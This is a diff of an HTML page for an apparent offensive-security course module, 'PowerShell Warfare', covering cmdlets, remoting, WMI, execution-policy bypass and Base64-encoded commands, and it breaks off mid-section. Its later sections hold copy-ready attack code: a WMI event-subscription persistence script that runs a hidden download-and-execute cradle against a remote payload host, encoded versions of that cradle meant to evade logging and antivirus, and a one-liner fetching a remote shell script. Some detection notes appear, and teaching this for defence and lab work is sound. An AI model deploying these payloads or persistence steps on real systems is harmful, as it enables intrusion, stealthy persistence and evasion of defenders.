@@ -12,6 +12,9 @@
             --accent2: #00ff88;
             --dim: #666;
             --border: #333;
+            --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -22,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .terminal {
             background: #111;
             border: 1px solid var(--border);
@@ -66,7 +70,23 @@
             margin: 1rem 0;
             border-radius: 0 8px 8px 0;
             overflow-x: auto;
+            font-family: Consolas, monospace;
+            font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -83,6 +103,14 @@
             margin: 1.5rem 0;
         }
         .first-principle h3 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .layman-term {
+            background: #1a1a1a;
+            border: 1px dashed var(--dim);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 8px;
+        }
+        .layman-term h4 { color: #ffaa00; margin-bottom: 0.5rem; }
         .progress-bar {
             width: 100%;
             height: 4px;
@@ -93,7 +121,7 @@
         .progress-fill {
             height: 100%;
             background: var(--accent);
-            width: 0%;
+            width: 13.6%;
             transition: width 0.5s;
             border-radius: 2px;
         }
@@ -116,14 +144,6 @@
             color: var(--accent2);
         }
         @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
-        .layman-term {
-            background: #1a1a1a;
-            border: 1px dashed var(--dim);
-            padding: 1rem;
-            margin: 1rem 0;
-            border-radius: 8px;
-        }
-        .layman-term h4 { color: #ffaa00; margin-bottom: 0.5rem; }
         .nav { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
         .nav a { color: var(--accent); text-decoration: none; padding: 0.3rem 0.8rem; border: 1px solid var(--accent); border-radius: 4px; }
         .nav a:hover { background: var(--accent); color: var(--bg); }
@@ -137,7 +157,149 @@
         }
         .status-live { background: var(--accent2); color: var(--bg); }
         .status-theory { background: #ffaa00; color: var(--bg); }
-        .status-stub { background: var(--dim); color: var(--bg); }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        .warning-box {
+            background: #2a0a0a;
+            border: 2px solid #ff5555;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
+        .why-box {
+            background: #1a1a0a;
+            border-left: 4px solid #ffaa00;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .why-box h5 { color: #ffaa00; margin-bottom: 0.5rem; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .step-box {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        .step-box h4 { color: var(--accent); margin-bottom: 0.5rem; }
+        .copy-paste {
+            background: #151520;
+            border: 1px solid #4444ff;
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            font-family: Consolas, monospace;
+            font-size: 12px;
+            color: #aaaaff;
+            margin: 0.5rem 0;
+            cursor: pointer;
+        }
+        .copy-paste:hover { background: #1a1a30; }
     </style>
 </head>
 <body>
@@ -145,27 +307,680 @@
         <div class="nav">
             <a href="index.html">← Home</a>
             <a href="MODULE_02_RECON.html">← Module 02</a>
-            <a href="MODULE_05_SHELLCODE.html">Module 05 →</a>
+            <a href="MODULE_04_POST_EXPLOITATION.html">Module 04 →</a>
         </div>
 
         <h1>Module 03: PowerShell Warfare <span class="status-badge status-live">LIVE TESTED</span></h1>
         
         <div class="progress-bar"><div class="progress-fill" style="width: 13.6%;"></div></div>
-        <p style="color: var(--dim); font-size: 0.9rem;">Module 3 of 22 — PowerShell fundamentals through live evidence</p>
+        <p style="color: var(--dim); font-size: 0.9rem;">Module 3 of 22 — PowerShell fundamentals, offensive techniques, and evasion</p>
 
-        <h2>First Principle: Everything is an Object</h2>
+        <!-- FIRST PRINCIPLE -->
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
-            <p>PowerShell doesn't just spit text like CMD. Everything is an <strong>object</strong> with properties and methods. <code>Get-Process</code> returns process objects, not strings. You can filter, sort, and manipulate them programmatically.</p>
-            <p style="margin-top: 0.5rem; color: var(--dim);">This is why <code>| Where-Object {$_.CPU -gt 100}</code> works — you're filtering objects by property, not parsing text with regex.</p>
+            <p>PowerShell is not a text shell like CMD or Bash. It is an <span class="neon-highlight">object-oriented automation engine</span> built on top of the .NET Framework. Every command returns structured objects with properties, methods, and types — not raw text. This means you can filter, sort, and manipulate system data programmatically without parsing strings.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">This is why <code>| Where-Object {$_.CPU -gt 100}</code> works — you're filtering objects by property, not parsing text with regex. For an attacker, this means you can query, manipulate, and weaponize every part of Windows as a first-class programming object.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Layman Translation</h4>
-            <p>CMD is like shouting into a room and reading what echoes back. PowerShell is like asking a librarian for a specific book, then asking that book for its table of contents, then asking for Chapter 3. The librarian (PowerShell) understands structured requests.</p>
+            <p>CMD is like shouting into a room and reading what echoes back. PowerShell is like asking a librarian for a specific book, then asking that book for its table of contents, then asking for Chapter 3. The librarian (PowerShell) understands structured requests and returns structured answers. You don't grep — you query.</p>
         </div>
 
-        <h2>Interactive Demo: Live PowerShell Terminal</h2>
+        <!-- PREREQUISITES / CROSS-LINKS -->
+        <h2>📚 Prerequisites & Cross-Links</h2>
+        <p style="margin-bottom: 1rem;">This module connects directly to other modules in the 22nd Survey Division course:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a></h4>
+                <p>PowerShell remoting uses WinRM over HTTP/HTTPS (ports 5985/5986). Understanding TCP, listeners, and firewalls from Module 01 is essential for lateral movement.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_08_PRIVESC.html" class="cross-link">Module 08: Privilege Escalation</a></h4>
+                <p>PowerShell is the primary delivery vehicle for privilege escalation exploits. Token manipulation, UAC bypass, and service abuse are all scripted in PowerShell.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>PowerShell can invoke Windows APIs directly via <code>Add-Type</code> and P/Invoke, enabling process injection, memory allocation, and reflective DLL loading without dropping binaries.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a></h4>
+                <p>Understanding how defenders detect PowerShell (AMSI, script block logging, ETW) helps you evade. Module 12 covers detection engineering from the blue side.</p>
+            </div>
+        </div>
+
+        <!-- SECTION 1: CMDLETS -->
+        <h2>1. Cmdlets — The Building Blocks</h2>
+        
+        <div class="why-box">
+            <h5>Why "Cmdlet"?</h5>
+            <p>PowerShell commands are called <span class="neon-highlight">cmdlets</span> (pronounced "command-lets"). They follow a <strong>Verb-Noun</strong> naming convention: <code>Get-Process</code>, <code>Stop-Service</code>, <code>Invoke-Expression</code>. This makes them self-discoverable. If you can guess the verb, you can find the command.</p>
+        </div>
+
+        <h3>Essential Verbs</h3>
+        <table>
+            <tr><th>Verb</th><th>Purpose</th><th>Example</th></tr>
+            <tr><td><span class="neon-highlight">Get</span></td><td>Retrieve data</td><td>Get-Process, Get-Service, Get-WmiObject</td></tr>
+            <tr><td><span class="neon-highlight">Set</span></td><td>Modify data</td><td>Set-ExecutionPolicy, Set-ItemProperty</td></tr>
+            <tr><td><span class="neon-highlight">Invoke</span></td><td>Execute or call</td><td>Invoke-Expression, Invoke-WebRequest, Invoke-Command</td></tr>
+            <tr><td><span class="neon-highlight">New</span></td><td>Create objects</td><td>New-Object, New-Item, New-Service</td></tr>
+            <tr><td><span class="neon-highlight">Remove</span></td><td>Delete objects</td><td>Remove-Item, Remove-Variable</td></tr>
+            <tr><td><span class="neon-highlight">Out</span></td><td>Output formatting</td><td>Out-File, Out-String, Out-GridView</td></tr>
+        </table>
+
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>Think of cmdlets as standardized military forms. Every form has a type (Verb) and a subject (Noun). "Get-Process" is like a "Request-Status" form for equipment. "Stop-Service" is a "Halt-Operation" order. The consistency means you can guess the form you need without memorizing hundreds of commands.</p>
+        </div>
+
+        <h3>Get-Help — Your Best Friend</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="prompt">PS&gt;</span> <span class="command">Get-Help Get-Process -Full</span>
+<span class="output"># Shows full documentation: syntax, parameters, examples, inputs, outputs</span>
+
+<span class="prompt">PS&gt;</span> <span class="command">Get-Help *process*</span>
+<span class="output"># Lists ALL cmdlets containing "process" — self-discovery</span>
+
+<span class="prompt">PS&gt;</span> <span class="command">Get-Command -Verb Get -Noun *Service*</span>
+<span class="output"># Lists every "Get" command related to services</span>
+        </div>
+
+        <h3>Get-Member — Peeking Inside Objects</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="prompt">PS&gt;</span> <span class="command">Get-Process | Get-Member</span>
+<span class="output"># Shows every property and method available on a Process object</span>
+<span class="output"># Properties: Id, Name, CPU, WorkingSet, Path, Company, ...</span>
+<span class="output"># Methods: Kill(), Refresh(), WaitForExit(), ...</span>
+
+<span class="prompt">PS&gt;</span> <span class="command">(Get-Process -Name notepad).Kill()</span>
+<span class="output"># Calls the Kill() method directly on the object — no text parsing needed</span>
+        </div>
+
+        <!-- SECTION 2: THE PIPELINE -->
+        <h2>2. The Pipeline — Objects Flow, Not Text</h2>
+        
+        <div class="first-principle">
+            <h3>🧠 The Pipeline Truth</h3>
+            <p>In traditional shells, the pipe (<code>|</code>) passes <strong>text</strong>. In PowerShell, the pipe passes <strong>objects</strong>. This means each command in a pipeline receives fully structured data with properties, methods, and types intact. You can filter by property, sort by method output, and export to any format without parsing.</p>
+        </div>
+
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># LAYMAN: "Show me the big processes"</span>
+<span class="command">Get-Process | Sort-Object CPU -Descending | Select-Object -First 5</span>
+
+<span class="highlight"># LOW-LEVEL: "Enumerate process structures, sort by kernel/user time, extract fields"</span>
+<span class="command">$procs = Get-Process
+$sorted = $procs | Sort-Object {$_.CPU} -Descending
+$top5 = $sorted | Select-Object -First 5
+$top5 | Format-Table Name, Id, CPU, WorkingSet</span>
+
+<span class="highlight"># FIRST PRINCIPLE: Objects flow through the pipeline, not text</span>
+<span class="output"># Each | passes OBJECTS, not strings. This is why PowerShell is a shell for hackers.</span>
+        </div>
+
+        <h3>Pipeline Filtering</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="prompt">PS&gt;</span> <span class="command">Get-Process | Where-Object {$_.WorkingSet64 -gt 100MB}</span>
+<span class="output"># Filter processes by memory usage (property comparison, not regex)</span>
+
+<span class="prompt">PS&gt;</span> <span class="command">Get-Process | Where-Object {$_.ProcessName -like "*chrome*"} | 
+    Select-Object Name, Id, @{N="RAM_MB";E={[math]::Round($_.WorkingSet64/1MB,2)}}</span>
+<span class="output"># Select specific properties + create calculated property on the fly</span>
+
+<span class="prompt">PS&gt;</span> <span class="command">Get-ChildItem C:\Windows\System32 | Where-Object {$_.Length -gt 1MB} | Sort-Object Length</span>
+<span class="output"># Find large files, sort by size — all object-based, no string parsing</span>
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>Imagine a conveyor belt in a factory. In a text shell, each worker gets a pile of paper notes and has to read them to know what to do. In PowerShell, each worker gets a physical object with labels and buttons. They can read the labels (properties) or press the buttons (methods) without any reading or writing. The object is the message.</p>
+        </div>
+
+        <!-- SECTION 3: REMOTING -->
+        <h2>3. PowerShell Remoting — Lateral Movement</h2>
+        
+        <div class="warning-box">
+            <h5>⚠️ Operational Security Warning</h5>
+            <p>PowerShell remoting creates Windows Event Log entries (Event ID 4103, 4104, 53504). It requires authentication and leaves forensic artifacts. Use with caution on engagements — or use evasion techniques covered later in this module.</p>
+        </div>
+
+        <h3>How Remoting Works</h3>
+        <p>PowerShell remoting uses <span class="neon-highlight">WinRM</span> (Windows Remote Management), which implements the WS-Management protocol over HTTP (port 5985) or HTTPS (port 5986). It encrypts traffic by default (even over HTTP) using Kerberos or NTLM session keys.</p>
+
+        <div class="step-box">
+            <h4>Enabling Remoting (Requires Admin)</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="prompt">PS&gt;</span> <span class="command">Enable-PSRemoting -Force</span>
+<span class="output"># Starts WinRM service, sets to auto-start, creates firewall exceptions</span>
+
+<span class="prompt">PS&gt;</span> <span class="command">Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force</span>
+<span class="output"># Trust all hosts (INSECURE — only for lab use)</span>
+            </div>
+        </div>
+
+        <h3>Invoke-Command — The Remote Execution Engine</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Execute a command on a remote machine</span>
+<span class="prompt">PS&gt;</span> <span class="command">Invoke-Command -ComputerName 192.168.1.42 -ScriptBlock { Get-Process } -Credential (Get-Credential)</span>
+
+<span class="highlight"># Run a local script on a remote machine</span>
+<span class="prompt">PS&gt;</span> <span class="command">Invoke-Command -ComputerName 192.168.1.42 -FilePath C:\Tools\recon.ps1</span>
+
+<span class="highlight"># Execute on multiple targets simultaneously</span>
+<span class="prompt">PS&gt;</span> <span class="command">$targets = @("192.168.1.42", "192.168.1.43", "192.168.1.44")
+Invoke-Command -ComputerName $targets -ScriptBlock { hostname; whoami } </span>
+
+<span class="highlight"># Establish a persistent session</span>
+<span class="prompt">PS&gt;</span> <span class="command">$sess = New-PSSession -ComputerName 192.168.1.42 -Credential domain\user
+Invoke-Command -Session $sess -ScriptBlock { Get-Process }
+Enter-PSSession -Session $sess  # Interactive remote shell</span>
+        </div>
+
+        <div class="why-box">
+            <h5>Why This Is Powerful for Attackers</h5>
+            <p><span class="neon-highlight">Invoke-Command</span> runs your code in a remote process but returns the output to your console. The code executes in a temporary process (wsmprovhost.exe) on the target. This means:</p>
+            <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                <li>No persistent process is left behind (ephemeral)</li>
+                <li>The code runs under the credentials you provide</li>
+                <li>You can run on 100 machines simultaneously with one command</li>
+                <li>The traffic is encrypted by default (blend in with legitimate admin activity)</li>
+            </ul>
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>PowerShell remoting is like having a secure phone line to every machine in the network. You dial the number (Invoke-Command), speak your order (ScriptBlock), and the soldier on the other end executes it and reports back. You never have to physically enter the building. The phone call is encrypted, so eavesdroppers (network monitoring) only hear static.</p>
+        </div>
+
+        <!-- SECTION 4: WMI -->
+        <h2>4. WMI — Windows Management Instrumentation</h2>
+        
+        <div class="first-principle">
+            <h3>🧠 The WMI Truth</h3>
+            <p><span class="neon-highlight">WMI</span> is Microsoft's implementation of the WBEM standard — a unified interface to query and manage every aspect of Windows: processes, services, disks, network adapters, event logs, installed software, and hardware. It has existed since Windows 2000 and is present on every Windows machine. Attackers love it because it's powerful, always available, and often overlooked by defenders.</p>
+        </div>
+
+        <h3>WMI Query Language (WQL)</h3>
+        <p>WQL is SQL-like. You query classes (tables) with SELECT statements:</p>
+        
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Basic WMI queries using Get-WmiObject (legacy) or Get-CimInstance (modern)</span>
+<span class="prompt">PS&gt;</span> <span class="command">Get-WmiObject -Class Win32_Process | Select-Object -First 5 Name, ProcessId</span>
+<span class="output"># Lists all processes — same as Get-Process but via WMI</span>
+
+<span class="prompt">PS&gt;</span> <span class="command">Get-WmiObject -Class Win32_Service | Where-Object {$_.State -eq "Running"} | Select-Object Name, StartMode</span>
+<span class="output"># Lists running services and their start mode</span>
+
+<span class="prompt">PS&gt;</span> <span class="command">Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, @{N="Size_GB";E={[math]::Round($_.Size/1GB,2)}}, @{N="Free_GB";E={[math]::Round($_.FreeSpace/1GB,2)}}</span>
+<span class="output"># Disk space information — useful for finding large drives to exfiltrate from</span>
+
+<span class="prompt">PS&gt;</span> <span class="command">Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled = 'True'" | Select-Object IPAddress, MACAddress, DefaultIPGateway</span>
+<span class="output"># Network configuration — IP, MAC, gateway for every active adapter</span>
+        </div>
+
+        <h3>WMI for Remote Recon</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Query WMI on a remote machine (no PSRemoting required!)</span>
+<span class="prompt">PS&gt;</span> <span class="command">Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.42 -Credential domain\user | Select-Object Name, ProcessId</span>
+
+<span class="highlight"># Check if a specific process is running on a remote host</span>
+<span class="prompt">PS&gt;</span> <span class="command">Get-WmiObject -Class Win32_Process -ComputerName 192.168.1.42 -Filter "Name = 'lsass.exe'"</span>
+
+<span class="highlight"># List installed software on remote machine</span>
+<span class="prompt">PS&gt;</span> <span class="command">Get-WmiObject -Class Win32_Product -ComputerName 192.168.1.42 | Select-Object Name, Version</span>
+        </div>
+
+        <div class="why-box">
+            <h5>Why WMI Over PSRemoting?</h5>
+            <p>WMI uses DCOM (port 135 + ephemeral ports) instead of WinRM (5985/5986). Many networks block WinRM but allow DCOM for legacy management tools. WMI is also quieter — it doesn't create the same Event ID 4104 (Script Block Logging) entries that PowerShell remoting does. It's the "old back door" that still works everywhere.</p>
+        </div>
+
+        <h3>WMI Event Subscription — Persistence</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Create a WMI event subscription that triggers on a timer (persistence)</span>
+<span class="command">$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
+    Name = "MyFilter"
+    EventNamespace = "root\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+}
+
+$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
+    Name = "MyConsumer"
+    CommandLineTemplate = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.92/payload.ps1')`""
+}
+
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
+    Filter = $filter
+    Consumer = $consumer
+}</span>
+<span class="output"># This creates a WMI persistence mechanism that runs every ~4 minutes after boot.</span>
+<span class="output"># No scheduled task, no registry run key, no service. Pure WMI.</span>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Detection Note</h5>
+            <p>WMI event subscriptions are logged in the WMI-Activity operational log (Event ID 5857, 5858, 5859). Defenders can query <code>root\subscription</code> namespace for __EventFilter and CommandLineEventConsumer instances. See <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a> for detection techniques.</p>
+        </div>
+
+        <div class="layman-term">
+            <h4>🎯 Soldier Translation</h4>
+            <p>WMI is like the building's maintenance system. It knows where every pipe is, every electrical panel, every room temperature, every security camera status. As an attacker, you don't need to break into each room — you just query the maintenance system (WMI) and it tells you everything. You can even program the maintenance system to automatically call you (event subscription) when certain conditions are met.</p>
+        </div>
+
+        <!-- SECTION 5: EXECUTION POLICY BYPASS -->
+        <h2>5. Execution Policy Bypass</h2>
+        
+        <div class="first-principle">
+            <h3>🧠 The Execution Policy Truth</h3>
+            <p>PowerShell's <span class="neon-highlight">Execution Policy</span> is <strong>NOT a security boundary</strong>. It is a user preference setting. Microsoft explicitly states this. It only controls whether scripts can run from files — it does NOT prevent interactive commands, encoded commands, or in-memory execution. Every red teamer knows: <span class="neon-amber">Execution Policy is theater, not security.</span></p>
+        </div>
+
+        <h3>Bypass Methods</h3>
+        
+        <div class="method-card">
+            <h4>Method 1: Command-Line Bypass <span class="difficulty diff-easy">EASY</span></h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="command">powershell -ExecutionPolicy Bypass -File C:\Tools\payload.ps1</span>
+<span class="output"># The -ExecutionPolicy flag overrides the system policy for THIS session only</span>
+
+<span class="command">powershell -ExecutionPolicy Unrestricted -Command "Get-Process"</span>
+<span class="output"># Unrestricted allows all scripts, including unsigned</span>
+
+<span class="command">powershell -ExecutionPolicy RemoteSigned -File script.ps1</span>
+<span class="output"># RemoteSigned requires signatures only for scripts downloaded from the internet</span>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>Method 2: Scope-Based Bypass <span class="difficulty diff-easy">EASY</span></h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="command">Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass</span>
+<span class="output"># Changes policy only for the current process — no registry change, no admin needed</span>
+
+<span class="command">Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted</span>
+<span class="output"># Changes policy for the current user only — persists but is user-specific</span>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>Method 3: Registry Bypass <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="command"># Read the current policy from registry</span>
+<span class="command">Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell -Name ExecutionPolicy</span>
+
+<span class="command"># Bypass by modifying the registry (requires admin for HKLM, user for HKCU)</span>
+<span class="command">Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell -Name ExecutionPolicy -Value Bypass</span>
+            </div>
+        </div>
+
+        <div class="method-card">
+            <h4>Method 4: No-File Execution (No Policy Needed) <span class="difficulty diff-easy">EASY</span></h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="command">powershell -Command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.92/payload.ps1')"</span>
+<span class="output"># -Command executes a string, not a file. Execution Policy does not apply.</span>
+
+<span class="command">powershell -Command "Get-Process | Where-Object {$_.CPU -gt 100} | Select-Object Name, CPU"</span>
+<span class="output"># Interactive commands are always allowed regardless of Execution Policy</span>
+            </div>
+        </div>
+
+        <div class="why-box">
+            <h5>Why Execution Policy Is Not Security</h5>
+            <p>Execution Policy was designed to prevent <em>accidental</em> script execution by users double-clicking .ps1 files. It was never designed to stop malicious actors. A determined attacker can:</p>
+            <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
+                <li>Use <code>-Command</code> or <code>-EncodedCommand</code> (no file involved)</li>
+                <li>Use <code>-ExecutionPolicy Bypass</code> on the command line</li>
+                <li>Call .NET APIs directly (bypassing PowerShell entirely)</li>
+                <li>Reflectively load assemblies into memory</li>
+            </ul>
+            <p style="margin-top: 0.5rem;">Real security comes from AppLocker, WDAC, Constrained Language Mode, and EDR — not Execution Policy.</p>
+        </div>
+
+        <!-- SECTION 6: ENCODED COMMANDS -->
+        <h2>6. Encoded Commands — Hiding in Plain Sight</h2>
+        
+        <div class="first-principle">
+            <h3>🧠 The Encoding Truth</h3>
+            <p>PowerShell's <span class="neon-highlight">-EncodedCommand</span> parameter accepts a Base64-encoded string that is decoded and executed in-memory. This bypasses command-line logging (the encoded string is logged, not the plaintext) and evades simple string-matching AV/EDR rules. It's the standard delivery mechanism for PowerShell payloads.</p>
+        </div>
+
+        <h3>How to Encode</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Step 1: Write your payload as a PowerShell command string</span>
+<span class="command">$command = 'IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.92/payload.ps1")'</span>
+
+<span class="highlight"># Step 2: Convert to Base64 (Unicode/UTF-16LE — PowerShell requirement)</span>
+<span class="command">$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encoded = [Convert]::ToBase64String($bytes)
+Write-Output $encoded</span>
+<span class="output"># Output: SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA5ADIALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==</span>
+
+<span class="highlight"># Step 3: Execute the encoded command</span>
+<span class="command">powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA5ADIALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==</span>
+        </div>
+
+        <h3>One-Liner Encoding</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+<span class="highlight"># Encode any command in one line (from cmd.exe or bash)</span>
+<span class="command">powershell -Command "$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Get-Process')); Write-Output $encoded"</span>
+
+<span class="highlight"># From Linux/attack machine, encode a PowerShell payload for Windows target</span>
+<span class="command">echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.92/shell.ps1")' | iconv -t UTF-16LE | base64 -w 0</span>
+        </div>
+
+        <div class="why-box">
+            <h5>Why Encoding Works</h5>
